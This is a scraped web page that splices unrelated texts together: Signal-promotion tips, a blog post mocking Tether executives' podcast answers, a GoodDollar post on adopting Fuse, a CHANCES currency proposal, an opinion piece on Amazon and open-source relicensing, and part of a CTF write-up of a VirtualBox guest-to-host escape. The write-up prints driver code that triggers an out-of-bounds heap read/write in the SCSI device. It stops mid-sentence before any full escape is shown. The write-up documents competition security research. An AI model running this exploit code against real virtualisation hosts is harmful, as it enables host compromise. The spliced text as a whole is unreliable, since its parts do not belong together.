<p><strong>Best practices</strong></p>

<p>Think about what time is best to post your status. Think about what your contacts are probably doing at the moment. They might not want to read 20 slides of text while they are at work.</p>

<p>At last position in your story I recommend the video from <a href="https://teddit.net/r/signal/comments/kv54u7/best_signal_video_for_your_whatsapp_status/">this post</a> (credits to <a href="https://teddit.net/u/carlosfx">u/carlosfx</a> !).</p>

<p>Signal published a <a href="https://twitter.com/signalapp/status/1349236175773462532">replacement for your profile pic</a> on their twitter account.</p>

<p><a href="https://teddit.net/u/Xath0n">u/Xath0n</a> suggested to put a text status with a direct link to <a href="https://signal.org/downloads">signal.org/downloads</a> at the end, so people don't need to search for it (Signal is in the top charts in the app stores currently, so it shouldn't be too hard to find anyway).</p>

<p>You can also thank everyone for watching your TED talk, lol.</p>

<p>If you think most of your contacts don't look into WhatsApp Status you can do the following:</p>

<ul>
<li>let them know that you want them to look into your WA Status, because it's important to you</li>
<li>send the slides to your contacts directly or in a group chat</li>
<li>send them the link to the images (note that the mobile view of imgbox is not the best)</li>
</ul>



<ul>
<li>I know that 19+ slides are a lot for a single WhatsApp Status and people might not read it <strong>but it is worth a try.</strong></li>
<li>It is intentionally written in simple terms to be understood by people who are not as tech savvy as you are.</li>
<li>Be prepared for questions, arguments, debates and to provide evidence of what your new status is saying (look up this subreddit for more info). Make sure you know the facts!</li>
<li>The style of the content may not appeal to everyone in your contact list.</li>
<li>Remember that some of your contacts don't look at WA Status at all.</li>
</ul>



<p><strong>Animated Status</strong> (old date)</p>

<p><a href="https://teddit.net/user/JordyEGNL/">u/JordyEGNL</a> submitted an animated version of the EN (for EU citizens) status: <a href="https://teddit.net/r/signal/comments/kx4msl/i_transformed_the_pictures_of_ucrazylizards_post/">check it out</a> !</p>

<p>Peter McCormack’s podcast with Paolo Ardoino and Stuart Hoegner from Tether/Bitfinex did shed some light on Tether’s operations. Stuart Hoegner, the general counsel, answered most of the questions. Given his position, the devil wasn’t in what he said, but how he said it.</p>



<p>Overall, it was a performance of deflecting questions, making legally true statements, and trying to sound legit AF while accusing “nocoiners” of creating “FUD”. Tether really needed to rebuild some goodwill with the coiner community.</p>



<h2>Customers aren’t users</h2>



<p>Paolo Ardoino, while explaining how Tether can issue USDTs on weekends, says: </p>



<blockquote><p>“most of our, uh, biggest customers are banked into the same bank (as Tether, i.e. Deltec)”. </p><cite>Paolo Ardoino</cite></blockquote>



<p>It’s revealing how he paused after “most of our”, as he was about to say “most of our customers” – which would have been very weird. How come those hundreds of thousands of people who use USDTs all over the world could ALL have an account at a small banking institution in the Cayman Islands?</p>



<p>In fact, it’s not weird at all – Tether is calling “customers” a very small number of actual users, the ones Tether is issuing USDTs. The rest aren’t customers, they’re users. The distinction is very important, for Tether also says that they perform complete AML and KYC on their customers. This means that they know who are the people (some exchanges and OTC desks) to whom they issue USDTs; but after that first step, feel free to do whatever you want, the blockchain is your oyster!</p>



<p>Stuart also points out at the end of the interview that they don’t have US customers. Which also makes his claim that they’re regulated by FinCEN much less grand – after all, it’s not that hard to comply with regulations when none apply.</p>



<h2>Reserves are YOLO</h2>



<h3>Reserves? We definitely have some</h3>



<p>At the time Stuart had to swear on the NYAG affidavit, he admitted that Tether’s reserves were 74% cash and equivalents, the rest being an IOU from Bitfinex. He says, “USDTs are 100% backed by reserves, so the loan to Bitfinex is still good backing”, and later on, “so maybe people object to the amount of the backing, but it’s not nothing”. Oh it’s not nothing, case closed!</p>



<p>One thing is clear – these reserves aren’t cash. It can be whatever Tether wants, valued at prices convenient to them:</p>



<figure><img src="http://www.tr0lly.com/wp-content/uploads/2021/01/Screen-Shot-2021-01-10-at-22.34.51.png" alt="" srcset="http://www.tr0lly.com/wp-content/uploads/2021/01/Screen-Shot-2021-01-10-at-22.34.51.png 618w, http://www.tr0lly.com/wp-content/uploads/2021/01/Screen-Shot-2021-01-10-at-22.34.51-300x201.png 300w" sizes="(max-width: 618px) 100vw, 618px"><figcaption>source: tether.to/legal</figcaption></figure>



<p>The rule of thumb is, whenever Tether talks about dollars, they don’t actually talk about dollars, but about their reserves, which aren’t dollars. Stuart says, </p>



<blockquote><p>“[at the time of the affidavit,] other than $2.1B in reserves (and today, just for context, that amount has grown to $22B), Tether had cash and cash equivalents on hand representing approximately 74% of the current outstanding USDTs). Just note that that loan is now $550m out of almost $22B in reserves – 2.5% of the total.” </p><cite>Stuart Hoegner</cite></blockquote>



<p>So we know the nature of 2.5% of their overall reserves – it’s the Bitfinex loan – but that doesn’t mean that the rest is cash. Why focus so much on such a small portion of their portfolio, then, if it isn’t to distract?</p>



<p>If you listened to the interview, you must have noticed how carefully Stuart is wording what he says, and the result is certainly very confusing for the average listener, who is entitled to believe they really have the $22 billion. I certainly heard exactly that, until I rewinded and listened to Stuart speak all over again.</p>



<h3>Backed by loans, like fiat</h3>



<p>Stuart also mentions “third party loans” as part of their reserves, like the loan to Bitfinex. Which is exactly how the fiat banking system works: banks will credit your account with new dollars if you sign an IOU. And it could very well explain how Tether ended up with a Bitfinex loan in the first place: Bitfinex needed 850m USDTs, didn’t have $850m, but simply signed an IOU for $850m. If you’ve seen the document, where Giancarlo Devasini, CFO of Tether and Bitfinex, signs both for Tether and Bitfinex, it’s epic.</p>



<p>Tether’s select few customers can access the USDT printer without any cash, and use the new USDTs for whatever they want. And you still wonder why Bitcoin has gone parabolic lately?</p>



<h2>Pumping Bitcoin</h2>



<h3>Tether owns Bitcoin, and they don’t want to say why</h3>



<p>Peter McCormack asks them, point blank, if they own Bitcoin, and if they use Tether to pump Bitcoin.</p>



<p>As per the affidavit, Stuart confirms that they own Bitcoin: </p>



<blockquote><p>“part of it is in Bitcoin; if nothing else, there are transaction fees, that need to be paid on the OMNI layer… we don’t presently comment on our asset makeup, overall, but we are contemplating starting a process of providing updates on that on the website this year”.</p><cite>Stuart Hoegner</cite></blockquote>



<p>Note how Stuart doesn’t say that the only Bitcoin they have is for the OMNI layer transactions. So they have other Bitcoin as well? And by the way, why are supposedly segregated customer assets being used to pay for operational costs?</p>



<p>Peter insists, “What’s the process of the Bitcoin reaching your basket?”, and this time Stuart deflects, “Paolo, do you have any comments on that?”</p>



<p>Left alone neck deep in shit by his lawyer, Paolo has no choice but to ask Peter to change the question: </p>



<blockquote><p>“Well, ummm… so… I’m not sure if the question is really clear. Are we talking about how we acquired the Bitcoin that we need to fulfil the OMNI layer transactions?”</p><cite>Paolo Ardoino</cite></blockquote>



<p>No Paolo, the question was why do you have Bitcoin in your reserves, not why you have a few Bitcoin for clear operational reasons. Why don’t you want to answer it?</p>



<h3>Tether buys Bitcoin, and they don’t want to say it</h3>



<p>When McCormack asks Stuart if they buy Bitcoin on the market, “at the right time”, and then pump it with Tethers, Stuart replies, </p>



<blockquote><p>“we don’t have the ability to buy Bitcoin at the right time in the market, we’re not prognosticators about wether the market’s gonna go up or down, that presumes some level of clairvoyance which we don’t have”. </p><cite>Stuart Hoegner</cite></blockquote>



<p>Well OK but the question wasn’t if you can see the future, but if you buy Bitcoin – why deflect it in such a weird way?</p>



<p>Peter insists “people say that you have the ability to pump the market by issuing Tethers”, to which Stuart replies, “We don’t issue Tethers to buy Bitcoin. We issue Tethers to customers who want Tethers.” So if a customer that happens to be Bitfinex wants to pump Bitcoin with USDT, that’s fine.</p>



<p>Then Paolo answers with its own rhetorical question.</p>



<blockquote><p>“The entire concept of us issuing Tethers to buy Bitcoins for ourselves doesn’t make sense. Why issue Tethers when we already have the dollars, and we have the ability to manage our inventory and out portfolio, when we could just use the dollars? The entire narrative is completely nonsense. Why do we have to do two steps when we can do one?”</p><cite>Paolo Ardoino</cite></blockquote>



<p>To answer Paolo’s rhetorical question with another rhetorical question, may I venture,</p>



<blockquote><p>“Why buy Bitcoins with real dollars, which are hard to get by, when you can simply print 20,000,000,000 USDTs that cost you nothing? Is it really because you’re too busy and want to save one <em>step</em>?”</p><cite>Trolly McTrollface</cite></blockquote>



<h2>No (unmet) redemptions</h2>



<p>Stuart boasts that all USDT redemption requests have always been met. Well, given Tether’s contract, that’s a pretty low bar:</p>



<figure><img src="http://www.tr0lly.com/wp-content/uploads/2021/01/Screen-Shot-2021-01-10-at-23.15.16.png" alt="" srcset="http://www.tr0lly.com/wp-content/uploads/2021/01/Screen-Shot-2021-01-10-at-23.15.16.png 640w, http://www.tr0lly.com/wp-content/uploads/2021/01/Screen-Shot-2021-01-10-at-23.15.16-300x73.png 300w" sizes="(max-width: 640px) 100vw, 640px"><figcaption>Sure we will redeem, just not right now – but we’re not rejecting your request!</figcaption></figure>



<p>The <a href="http://tether.to/legal">whole USDT contract is just incredible</a>, when you read it. USDTs aren’t legal claims on Tether’s reserves. Maybe they are for Tether’s customers, who might have signed a different agreement with Tether. But if you’re not a Tether customer, USDTs are just digital toilet paper. You might be left with it forever on the blockchain, as a stark reminder that database entries without a contract in the real world, are utterly worthless.</p>

<h3><strong>GoodDollar Is Striving To Deliver Universal Basic Income At scale –&nbsp;So Determining Which Blockchain To Use Is Critical. We Have Chosen Fuse For High-Volume, Low-Cost Transactions</strong></h3>



<p>Over the past few years, one of the main talking points relating to blockchain improving financial inclusion has been focused on efficiency and a reduction in transaction costs. But which blockchain to use to deliver universal basic income? Anyone who has ever tried to execute an “on-chain” transaction on a public blockchain quickly faces the reality: on-chain transactions have costs.</p>



<p>Oftentimes, these costs are equivalent to or greater than the transaction costs in well-known peer-to-peer money transfer solutions such as PayPal, Venmo, M-Pesa, not to mention while lacking the convenience of those centralized services. On the Ethereum network, <a href="https://cointelegraph.com/news/ethereum-network-use-hits-a-new-all-time-high-will-eth-price-follow" target="_blank" aria-label="undefined (opens in a new tab)" rel="noreferrer noopener">gas prices continue to rise</a>, with transaction costs currently hovering (but not limited to) approximately 40 to 50 cents a transaction, and at many times during the past year, transactions on mainnet have cost more than $1.</p>



<p>The <a href="https://www.gooddollar.org/" target="_blank" aria-label="undefined (opens in a new tab)" rel="noreferrer noopener">GoodDollar</a> protocol proposes a basic income economy that pays out small amounts of daily basic income to millions of people a day. Initially, the value of income delivered per day per person may range from <a href="https://simulator.gooddollar.org/" target="_blank" aria-label="undefined (opens in a new tab)" rel="noreferrer noopener">cents on the dollar to a few dollars</a>. Clearly, paying $1 in transaction fees to distribute 25 cents of basic income to millions of users does not make sense.</p>



<p>The solution to this challenge has come in the form of side-chains, networks that enable interoperability and “speak the same language” as a public blockchain such as Ethereum, without asking the same requirements of users to interact with the blockchain. These side-chains are solutions that are designed to solve problems inherent to working on Mainnet (transaction fees), while still enabling projects such as GoodDollar and their users to access the many benefits of the Ethereum network’s widely adopted public network.</p>



<h4><strong>Which Blockchain To Use?</strong></h4>



<p>In GoodDollar’s case, the challenge was finding a technical infrastructure that could manage a high volume, high-frequency transactions with a working costs structure, while also providing access to liquidity, fiat on/off-ramps, security confidence, and service providers that have grown alongside Ethereum. There are several options for Ethereum side-chains, with Fuse Network and POA Network being among some of the most well known. But which blockchain to use?</p>



<p>In determining what side-chain to build atop, the choice was GoodDollar for <a href="https://fuse.io/" target="_blank" aria-label="undefined (opens in a new tab)" rel="noreferrer noopener">Fuse</a> was self-evident because of Fuse and GoodDollar’s shared mission to develop products that appeal to mass-market, non-technical users. In order to onboard mass users, we must be able to provide a simple user experience that doesn’t suffer from the same usability hurdles that constitute the experience of using most crypto applications: the need to pay gas, understand verification times, public addresses and securely maintain private keys.</p>



<p>Offering a decentralized basic income architecture is key to our mission, and until very recently imagining a system like that would have been impossible (unless, of course, we were to resort to using a centralized user-wallet system and compromise the non-custodial nature of crypto).&nbsp;</p>



<p>But today, fortunately, we don’t have to face this trade-off. Thanks to the wide adoption of token standards such as ERC-20, new service providers have emerged throughout the Ethereum ecosystem that addresses every part of the software stack. This, in turn, allows projects like ours much greater agility, flexibility and options in deciding how to develop and build their offerings.</p>



<p>This is why, when answering the question about which blockchain to use, we chose to build on Fuse:</p>



<ul><li>Fuse is built for non-technical end-users: it obfuscates the experience of working on a public blockchain.</li><li>Fuse enables user accounts to have real blockchain wallets that have public addresses without having to manage private keys.</li><li>End-users never pay transaction fees.</li><li>Transactions are completed in a simple way, making it an ideal use case for payments and send/receive functions, key to how we see the GoodDollar economy will grow.</li><li>Fuse is able to communicate and interact with the Ethereum public blockchain as the G$ coin operates on both the Ethereum and Fuse blockchain simultaneously. It does this through its Mainnet bridge. G$ coin running on both Mainnet and Fuse is what enables the <a href="https://www.gooddollar.org/economic-model/" target="_blank" aria-label="undefined (opens in a new tab)" rel="noreferrer noopener">creation of value for G$ coin,</a> while enabling it to reach end-users (Claimers).</li><li>Because of Fuse’s bridge to the Ethereum mainnet, users are able to interact with the wide range of liquidity and services that exist on Ethereum, such as on-and-off ramps, decentralized finance applications, other applications, and more.</li></ul>



<p>After selecting the Fuse Network as our partner, we decided to participate as a <a href="https://docs.fuse.io/the-fuse-chain/getting-started/how-to-become-a-validator" target="_blank" aria-label="undefined (opens in a new tab)" rel="noreferrer noopener">validator of the Fuse Network</a>, joining the group of participants that are committed to the network running steadily, safely and securely. As we race towards the launch of G$ coin, we couldn’t be more excited to be one of the first live working use-cases of the Fuse Network, and thank the Fuse team for all of their commitment and partnership in being a key part to bringing us so far.</p>

<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div itemprop="articleBody"><p>This post is about a VirtualBox escape for the latest currently available version (VirtualBox 6.1.16 on Windows). The vulnerabilities were discovered and exploited by our team <a href="https://twitter.com/Sauercl0ud">Sauercl0ud</a> as part of the <a href="https://realworldctf.com/">RealWorld CTF 2020/2021</a>.</p><p>The vulnerability was known to the organizers, requires the guest to be able to insert kernel modules and isn’t exploitable on default configurations of VirtualBox so the impact is very limited.</p><p>Many thanks to the organizers for hosting this great competition, especially to ChenNan for creating this challenge, <a href="https://twitter.com/M4x_1997">M4x</a> for always being helpful, answering our questions and sitting with us through the many demo attempts and of course all <a href="#credits">the people involved</a> in writing the exploit.</p><p>Let’s get to some pwning :D</p><h2 id="discovering-the-vulnerability"> <a href="#discovering-the-vulnerability">Discovering the Vulnerability</a></h2><p>The challenge description already hints at where a bug might be:</p><blockquote><p>Goal:</p><p>Please escape VirtualBox and spawn a calc(“C:\Windows\System32\calc.exe”) on the host operating system.</p><p>You have the full permissions of the guest operating system and can do anything in the guest, including loading drivers, etc.</p><p>But you can’t do anything in the host, including modifying the guest configuration file, etc.</p><p><strong>Hint: SCSI controller is enabled and marked as bootable.</strong></p><p>Environment:</p><p>In order to ensure a clean environment, we use virtual machine nesting to build the environment.

</code></pre><p>The <code>SCSI</code> device implements a simple state machine with a global heap allocated buffer. When initiating the state machine, we can set the buffer size and the state machine will set a global buffer pointer to point to the start of said buffer. From there on, we can either read one or more bytes, or write one or more bytes. Every read/write operation will advance the buffer pointer. This means that after reading a byte from the buffer, we can’t write that same byte and vice versa, because the buffer pointer has already been advanced.</p><p>While auditing the <code>vboxscsiReadString</code> function, <a href="https://twitter.com/_tsuro">tsuro</a> and <a href="https://twitter.com/__spq__">spq</a> found something interesting:</p><pre><code><span>// src/VBox/Devices/Storage/VBoxSCSI.cpp</span>

</code></pre><p>We can fully control <code>cbTransfer</code> in this function. The function initially makes sure that we’re not trying to read more than the buffer size <code>[1]</code>. Then, it copies <code>cbTransfer</code> bytes from the global buffer into another buffer <code>[2]</code>, which will be sent to the guest driver. Finally, <code>cbTransfer</code> bytes get subtracted from the remaining size of the buffer <code>[3]</code> and if that remaining size hits zero, it will reset the SCSI device and require the user to reinitiate the machine state, before reading any more bytes.</p><p>So much for the logic, but what’s the issue here? There is a check at <code>[1]</code> that ensures no single read operation reads more than the buffer’s size. But this is the wrong check. It should verify, that no single read can read more than the buffer <strong>has left</strong>. Let’s say we allocate a buffer with a size of 40 bytes. Now we call this function to read 39 bytes. This will advance the buffer pointer to point to the 40th byte. Now we call the function again and tell it to read 2 more bytes. The check in <code>[1]</code> won’t bail out, since 2 is less than the buffer size of 40, however we will have read 41 bytes in total. Additionally, this will cause the subtraction in <code>[3]</code> to underflow and <code>cbBufLeft</code> will be set to <code>UINT32_MAX-1</code>. This same <code>cbBufLeft</code> will be checked when doing write operations and since it is very large now, we’ll be able to also write bytes that are outside of our buffer.</p><h2 id="getting-oob-readwrite"> <a href="#getting-oob-readwrite">Getting OOB read/write</a></h2><p>We understand the vulnerability, so it’s time to develop a driver to exploit it. Ironically enough, the “getting a driver to build” part was actually one of the hardest (and most annoying) parts of the exploit development. <a href="https://twitter.com/fktio">malle</a> got to building VirtualBox from source in order for us to have symbols and a debuggable process while <a href="https://twitter.com/0x4d5aC">0x4d5a</a> came up with the idea of using the <a href="https://github.com/hacksysteam/HackSysExtremeVulnerableDriver">HEVD</a> driver as a base for us to work with, since it does some similar things to what we need. Now let’s finally start writing some code.</p><p>Here’s how we triggered the bug:</p><pre><code><span>void</span> exploit() {
    <span>static</span> <span>const</span> <span>uint8_t</span> cdb[<span>1</span>] <span>=</span> {<span>0</span>};
    <span>static</span> <span>const</span> <span>short</span> port <span>=</span> <span>0x434</span>;
    <span>static</span> <span>const</span> <span>uint32_t</span> buffer_size <span>=</span> <span>1024</span>;

    <span>// reset the state machine</span>
    __outbyte(port<span>+</span><span>3</span>, <span>0</span>);

    <span>// initiate a write operation</span>
    __outbyte(port<span>+</span><span>0</span>, <span>0</span>); <span>// TargetDevice (0)</span>
    __outbyte(port<span>+</span><span>0</span>, <span>1</span>); <span>// direction (to device)</span>
    
    __outbyte(port<span>+</span><span>0</span>, ((buffer_size <span>&gt;&gt;</span> <span>12</span>) <span>&amp;</span> <span>0xf0</span>) <span>|</span> (<span>sizeof</span>(cdb) <span>&amp;</span> <span>0xf</span>)); <span>// buffer length hi &amp; cdb length</span>
    __outbyte(port<span>+</span><span>0</span>, buffer_size);                                        <span>// bugger length low</span>
    __outbyte(port<span>+</span><span>0</span>, buffer_size <span>&gt;&gt;</span> <span>8</span>);                                   <span>// buffer length mid</span>
    
    <span>for</span>(<span>int</span> i <span>=</span> <span>0</span>; i <span>&lt;</span> <span>sizeof</span>(cdb); i<span>++</span>)
        __outbyte(port<span>+</span><span>0</span>, cdb[i]);


    <span>// move the buffer pointer to 8 byte after the buffer and the remaining bytes to -8</span>
    <span>char</span> buf[buffer_size];
    __inbytestring(port<span>+</span><span>1</span>, buf, buffer_size <span>-</span> <span>1</span>)    <span>// Read bufsize-1</span>
    __inbytestring(port<span>+</span><span>1</span>, buf, <span>9</span>)                  <span>// Read 9 more bytes</span>

    <span>for</span>(<span>int</span> i <span>=</span> <span>0</span>; i <span>&lt;</span> <span>sizeof</span>(buf); i <span>+=</span> <span>4</span>)
        <span>*</span>((<span>uint32_t</span><span>*</span>)(<span>&amp;</span>buf[i])) <span>=</span> <span>0xdeadbeef</span>
    <span>for</span>(<span>int</span> i <span>=</span> <span>0</span>; i <span>&lt;</span> <span>10000</span>; i<span>++</span>)
        __outbytestring(port<span>+</span><span>1</span>, buf, <span>sizeof</span>(buf))
}

</code></pre><p>The driver first has to initiate the <code>SCSI</code> state machine with a <code>bufsize</code>. Then we read <code>bufsize-1</code> bytes and then we read 9 bytes. We chose 9 instead of 2 byte in order to have the buffer pointer 8 byte aligned after the overflow. Finally, we overwrite the next 10000kb after our allocated <code>buffer+8</code> with <code>0xdeadbeef</code>.</p><p>After loading this driver in the win7 guest, this is what we get: <img src="https://secret.club/assets/sauercl0ud/VM-aborted.png" alt=""></p><p>As expected, the VM crashes because we corrupted the heap. Now we know that our OOB read/write works and since working with drivers was annoying, we decided to modify the driver one last time to expose the vulnerability to user-space. The driver was modified to accept this <code>Req</code> struct via an <code>IOCTL</code>:</p><pre><code><span>enum</span> operations {
    OPERATION_OUTBYTE <span>=</span> <span>0</span>,
    OPERATION_INBYTE <span>=</span> <span>1</span>,
    OPERATION_OUTSTR <span>=</span> <span>2</span>,
    OPERATION_INSTR <span>=</span> <span>3</span>,
};

<span>typedef</span> <span>struct</span> {
    <span>volatile</span> <span>unsigned</span> <span>int</span> port;
    <span>volatile</span> <span>unsigned</span> <span>int</span> operation;
    <span>volatile</span> <span>unsigned</span> <span>int</span> data_byte_out;
} Req;
</code></pre><p>This enables us to use the driver as a bridge to communicate with the <code>SCSI</code> device from any user-space program. This makes exploit prototyping a whole lot faster and has the added benefit of removing the need to touch Windows drivers ever again (well, for the rest of this exploit anyway :D).</p><p>The bug gives us a liner heap OOB read/write primitive. Our goal is to get from here to arbitrary code execution so let’s put this bug to use!</p><h2 id="leaking-vboxcdll-and-heap-addresses"> <a href="#leaking-vboxcdll-and-heap-addresses">Leaking <code>vboxc.dll</code> and heap addresses</a></h2><p>We’re able to dump heap data using our OOB read but we’re still far from code execution.

<p><strong>Abstract</strong>: To the question, “what features would make for an ideal, highly transactable, universally adopted digital currency?” we explore major limitations with existing cryptocurrencies and propose a digital money called CHANCES.</p>



<h2>What is the ideal currency?</h2>



<p>The ideal currency would have stable prices, an elastic and predictable money supply, no transaction costs, and be widely obtainable by participants in any economy. We consider the relationships between wealth, assets, and money, and propose CHANCES as a better currency than traditional fiat and cryptos, and we take full advantage of an all digital currency.</p>



<h2>CHANCES…</h2>



<p>… pegs the money supply to the total number of verified participants.</p>



<p>… gives 1.000.000 (one-million) c$ to every new verified participant</p>



<p>… allows one and only one authentic registration (participants cannot sign up more than once)</p>



<p>… continuously replenishes verified accounts below 1.000.000 c$ (without inflating money supply, at up to 10.000 c$ monthly)</p>



<p>… slowly draws money from accounts over 1.000.000 c$ (at a rate of less than 1% per month)</p>



<p>… has no transaction fees, no miners, can reverse fraudulent transactions, and insure deposits.</p>



<h2>Why?</h2>



<p>Money is in all ways relative. It is not wealth, in and of itself, so what is it?</p>



<p>CHANCES supposes that in modern, western economies, which are roughly 2/3rds service based, money mainly represents economic potential, such as the ability to command someone’s attention to perform labor or a service or to create something to be consumed. CHANCES explicitly draws on this connection by supposing that 1.) the money supply represents the total economic potential of all participants in an economy, 2.) that a unit of money represents some portion of potential thereof, and 3.) since the economic value is different between each participant, the function of the marketplace is to continuously discover these relative values and adjust money flows (income and prices) proportionately. For example, a doctor might be paid more than a car mechanic, which is what the marketplace participants are free to discover.</p>



<p>CHANCES looks at money as economic potential, and considers that it must be replenished continuously through the economy and that high participation optimizes choice and competition in a marketplace.</p>



<p>We suppose that the initial allotment of 1.000.000 c$ is approximately 8.5 years of average potential economic value of any random individual. Initial allotments help produce new capital pools to be used in organized endeavors within the economy and can be used to expand money supply through through lending and borrowing.</p>



<p>10.000 c$ is distributed to all identity-verified accounts monthly to replenish participation capability in the economy, and proves each verified participant credit worthy. This distribution is funded by simultaneously drawing 1% monthly from all account balances. This has the following effect on verified account balances:</p>



<figure><table><tbody><tr><td><strong>Starting balance</strong></td><td><strong>Monthly change</strong></td></tr><tr><td>0</td><td>+ 10.000 c$</td></tr><tr><td>500.000</td><td>+ 5.000 c$</td></tr><tr><td>1.000.000</td><td>no change</td></tr><tr><td>1.500.000</td><td>– 5.000 c$</td></tr><tr><td>2.000.000</td><td>– 10.000 c$</td></tr></tbody></table></figure>



<p>Unverified and anonymous accounts may exist, however, they are not given an initial allotment and do not receive any monthly benefit. Additionally, they are still subject to the 1% universal draw-down and they do not affect the base money supply.</p>



<h2><strong>Money supply</strong></h2>



<p>Pegging money supply to number of verified participants (benefactors) is a novel way to to keep prices stable while encouraging the network to grow. There is no hold and wait incentive that shows up in traditional cryptocurrencies, and there is no late-adopter penalty where people who come in later pay more to enter.</p>



<p>The following shows the relationship between verified participants and the money supply. </p>



<figure><table><tbody><tr><td><strong>Accounts</strong></td><td><strong>Base Money Supply (in millions)</strong></td><td><strong>Relative Value</strong></td></tr><tr><td>1 verified account<br>1 wallet</td><td>1 c$</td><td>1</td></tr><tr><td>1 verified account<br>100 wallets</td><td>1 c$</td><td>1</td></tr><tr><td>1000 verified accounts<br>10.952 wallets</td><td>1.000 c$</td><td>1</td></tr><tr><td>365.000.000 verified accounts<br>1bln wallets</td><td>365.000.000 c$</td><td>1</td></tr><tr><td>8 bln verified accounts<br>100 bln wallets</td><td>8.000.000.000 c$</td><td>1</td></tr></tbody></table></figure>



<p>Operating and maintaining this public, not for profit network will require overhead. We propose that internal accounts will be created and tied exclusively to a CHANCES Foundation. These accounts will be listed publicly and used to spend money on the network to cover operational costs which will also be publicly posted. Internally used accounts will be subject to the same 1% draw and replenishment rules. </p>



<h2>Features of Chances</h2>



<figure><table><tbody><tr><td></td><td><strong>Chances</strong></td><td><strong>Bitcoin</strong></td></tr><tr><td>Centralized</td><td>Yes</td><td>No</td></tr><tr><td>Reversible Transactions</td><td>Yes</td><td>No</td></tr><tr><td>Transaction fees</td><td>None</td><td>Variable/high</td></tr><tr><td>Transaction speed</td><td>Immediate</td><td>*1 hour+</td></tr><tr><td>Deposit insurance</td><td>Yes</td><td>No</td></tr><tr><td>Privacy</td><td>Yes</td><td>No</td></tr><tr><td>Anonymity</td><td>No</td><td>**No</td></tr><tr><td>Money supply</td><td>Elastic</td><td>Constrained</td></tr><tr><td>Price volatility</td><td>Stable</td><td>Volatile</td></tr><tr><td>Transactability</td><td>High</td><td>Low</td></tr><tr><td>Low energy consumption</td><td>Yes</td><td>No</td></tr><tr><td>Cryptographically secure</td><td>Yes</td><td>Yes</td></tr><tr><td>Meaningful</td><td>Yes</td><td>No</td></tr><tr><td>Incentive to spend</td><td>Yes</td><td>No</td></tr></tbody></table><figcaption>* Variable <br>** Functionally, not anonymous.</figcaption></figure>



<h2>Privacy &amp; anonymity</h2>



<p>Anonymity is the ability to transact without exposing identifying information to any counter-party or 3rd-party. Privacy is a degree of protection from having your transactions disclosed to a 3rd-party.</p>



<p>Cryptocoins, although transactionally secure, offer no anonymity above and beyond existing methods available to all forms of money, such as obfuscation through legal entities, or bank mixing schemes, and indeed, they decrease privacy as every transaction is publicly recorded. One need only know some number of wallet locations and their benefactors in order to reveal a detailed picture of participants. </p>



<p><strong>Primary exposure points include:</strong></p>



<ul><li>Exchanging into crypto at market through an exchange.</li><li>Establishing “mining” setups while paying for them with non-crypto currency.</li><li>Behavioral analysis, by tracking the flow of transactions and their timings to deduce whom has transacted.</li><li>Use of third party wallets.</li></ul>



<p>Truly, in any mode of exchange, some level of personal detail is exposed, and any transaction can only be undertaken if the benefits outweigh the risk of exposure. Many transactions indeed benefit from knowing the counter party to the transaction, such as when using bank cards and 3rd party payment processors to create safe and trustworthy shopping environments. </p>



<p>Although not anonymous, typical banking laws in OECD countries offer superior privacy to distributed ledger based crypto currencies. True anonymity for a widely adopted currency seems neither possible nor practical, and we instead take a view towards privacy in establishing the framework for Chances.</p>



<h2>Distributed ledgers</h2>



<p>Given that distributed ledgers do not protect privacy, we do not intend to implement them for CHANCES. We expect to use a cryptographically secure, private ledger than can be audited without disclosing user information.</p>



<h2>Why has nobody adopted crypto for transacting?</h2>



<p>Please see a break-out of this discussion. <a href="https://nealbozeman.com/crypto-adoption" data-type="post" data-id="368">Why cryptocoins have not been adopted by the marketplace</a></p>

<p><em>Recently a friend wrote asking me “what’s up with Amazon and open source?” and “is there a chance these new licenses will be approved by OSI?” What follows is my reply.</em></p>

<hr>

<p>There’s been a rash of open source project relicensing happening the past few months, and in nearly every case the company making the licensing change is claiming that that they’re doing it to protect the project in question from Amazon.</p>

<p>That is a big steaming pile of bullshit.</p>

<p>First of all: There is absolutely <em>nothing</em> wrong with how Amazon is using these open source projects. They are operating completely and entirely within the bounds of the licenses of the projects. Fingers need to be wagged here, but not at Amazon.</p>

<p>These projects are not being relicensed to protect them from Amazon. Claiming that they are is at best naive and at worst wilfully lying. These companies are relicensing projects to cover for the fact that they are ignorant of how to run a successful business. They knowingly released their secret sauce under permissive licenses and have discovered that doing so means that competitors can create more compelling product offerings based upon the same technology. This is entirely in accordance not only with the licenses that these companies knowingly chose, but also with a competitive market. The only problem with this is that it came as a surprise to these “open source” companies and now they’re reacting poorly.</p>

<p>If these companies actually cared about the <em>projects</em>, they would have invested the resources to build stronger communities around them. They would have reached out to Amazon, encouraged them to contribute back to the projects, and helped them to do so. They would NOT have taken the few community contributions—and you will find that most of these projects do not have many contributions from outside of the originating company, showing how poorly they managed their communities—they would not have taken these contributions from community members and then locked them behind proprietary licenses, violating the trust of their community.</p>

<p>You will find that none of the companies that have relicensed their projects address any of these issues. They don’t discuss how they tried to engage Amazon in their communities, how their attempts fell on deaf ears or were rebuffed. They can’t do this because thus far there is no evidence to show they even tried. I know a lot of the <a href="https://aws.amazon.com/blogs/opensource/">open source leadership at Amazon</a>. They’re good people who care deeply about free and open source and who are working to do the right thing by all of the communities of the projects they build upon. They would have been very open to hearing how they could make a positive difference in those communities. They’re a relatively few people across a very large company, so it may have taken a bit more time to get those contribution balls rolling, but they would have worked very hard to do so…had they been approached.</p>

<p>So don’t fall into the trap of unquestionably believing the recent spate of anti-Amazon propaganda. It comes from, without exception, companies that simply do not appear to understand how to operate successful businesses. From what I can tell, they’ve received poor advice from their VCs. Not knowing any better, they understandably followed this advice and now they’re paying the price.</p>

<p>As far as whether there’s any chance these new licenses will be OSI approved, I answer a pretty definitive “no.” There are two reasons for this. First of all, these companies would have to <a href="https://opensource.org/approval">submit the licenses for review</a>. OSI does not just go looking for licenses to review. License creators must take the action to say, “Hey, this is a new license that we believe adheres to the <a href="https://opensource.org/osd-annotated">Open Source Definition</a>. It’s valuable to us and to the community that it be recognised as such. Could you please review it and confirm that?” So far only one company has tried that and they failed to get their license approved, because of the second reason…</p>

<p>In order to become OSI-approved, licenses must adhere to the <a href="https://opensource.org/osd-annotated">Open Source Definition (OSD)</a>. These new licenses do not. While the ways they diverge from the OSD are varied, the most common ones are that they violate either “6. No Discrimination Against Fields of Endeavor”, “8. License Must Not Be Specific to a Product”, “9. License Must Not Restrict Other Software”, or “10. License Must Be Technology-Neutral”.</p>

